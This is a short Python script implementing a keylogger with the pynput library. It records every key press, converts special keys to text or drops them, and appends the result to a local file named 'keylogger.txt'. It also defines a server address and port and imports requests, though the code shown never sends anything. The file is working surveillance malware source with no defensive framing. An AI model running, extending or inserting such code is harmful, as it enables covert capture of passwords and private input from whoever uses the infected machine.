# listener class, monitor keyboard 
from pynput.keyboard import Listener 
import requests

server = "http://192.168.0.199"
port = 4444

def writetofile(key):

	keystroke= str(key)
	keystroke = keystroke.replace("'", "")

	keys_to_discard = [
		"Key.esc", "Key.ctrl", "Key.alt",
		"Key.shift", "Key.caps_lock", "Key.backspace",
		"Key.tab", "Key.right"
	]

	if keystroke == "Key.space":

			keystroke = ' '
	
	if keystroke == "Key.enter":

			keystroke = '\n'
	
	if keystroke in keys_to_discard:
			
			keystroke = ''

	with open("keylogger.txt", 'a') as f:
		f.write(keystroke)
 
# on_press argument makes the function execute everytime

with Listener(on_press=writetofile) as l:
# put the program into a blocking state, waiting indefinitely from the listeners, until we manually terminate it
	l.join()




